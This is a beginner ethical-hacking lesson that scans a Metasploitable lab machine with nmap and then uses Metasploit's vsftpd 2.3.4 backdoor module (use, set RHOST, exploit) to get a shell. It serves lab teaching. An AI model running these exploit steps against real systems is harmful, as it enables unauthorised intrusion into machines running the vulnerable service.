# Access to operating systems

## High Level Goals

By the end of this lesson, you will be familiar with the following:
1. Introduction to gaining access
2. Server side.

## Introduction 

In this stage, we're going to be talking about gaining access to computer devices.

What do we mean by computer devices?
Any electronic device you see is a computer. A phone, a TV, a laptop, a web server, a website, a network, a router, all of these things are computers
Each one of them has an operating system, and they have programs installed on these operating systems.

We're going to be talking about attacking these devices from two main sides: 
1. Server side.
2. Client side.


## server side

First things, we want to run the kali and the Metasploitable.
We want to know the information about the target, we need to scan the target

	nmap 10.0.2.7

> In my case the IP adress of the Metasploitable is 10.0.2.7 you will have another IP.
 
 we will see these output
 
	┌──(tetra㉿kali)-[~]
	└─$ nmap -sV 10.0.2.7    
	Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-24 10:46 EEST
	Nmap scan report for 10.0.2.7
	Host is up (0.00013s latency).
	Not shown: 977 closed ports
	PORT     STATE SERVICE     VERSION
	21/tcp   open  ftp         vsftpd 2.3.4
	22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
	23/tcp   open  telnet      Linux telnetd
	25/tcp   open  smtp        Postfix smtpd
	53/tcp   open  domain      ISC BIND 9.4.2
	80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
	111/tcp  open  rpcbind     2 (RPC #100000)
	139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	512/tcp  open  exec        netkit-rsh rexecd
	513/tcp  open  login       OpenBSD or Solaris rlogind
	514/tcp  open  tcpwrapped
	1099/tcp open  java-rmi    GNU Classpath grmiregistry
	1524/tcp open  bindshell   Metasploitable root shell
	2049/tcp open  nfs         2-4 (RPC #100003)
	2121/tcp open  ftp         ProFTPD 1.3.1
	3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
	5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
	5900/tcp open  vnc         VNC (protocol 3.3)
	6000/tcp open  X11         (access denied)                                   
	6667/tcp open  irc         UnrealIRCd                                        
	8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)                      
	8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1               
	MAC Address: 08:00:27:10:69:2F (Oracle VirtualBox virtual NIC)               
	Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 11.86 seconds


know we see we have port `21/tcp` is open and running `ftp` service which have `vsftpd 2.3.4`  if we go in the Google and write vsftpd 2.3.4 exploit

![vsftpdexploit](/img/vsftpdexploit1.png)

### Metasploit 

What is Metasploit 

Metasploit is an exploit development and execution tool. it can also be used to carry out other penetration testing tasks such as port scans, service identification and post exploitation tasks. We have some command for Metasploit 

|command| what it does |
|--|--|
| `msfconsole` | runs the metasploit console |
| `help` | shows help |
| `show [something]` | something can be exploits, payloads, auxiliaries or options |
| `use[something]` | use a certain exploit, payload or auxiliary |
| `set[option] [value]` | confider[option] to have a value of [value]|
| `exploit` | runs the current task |

now go to the terminal:

1. write `msfconsole` 

![msfconsole1](/img/msfconsole1.png)

2. we want to add the command that we take it from this [website,](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/) which is `use exploit/unix/ftp/vsftpd_234_backdoor`

![msfconsole2](/img/msfconsole2.png)

3.  we need to show option to know what can we do `show options`

![showoption](/img/showoption.png)

4. we need to change the `RHOST` by using `set RHOST 10.0.2.7`

![setRHOST](/img/setRHOST.png)

5. know write `exploit` awesome we hacked the Metasploit .

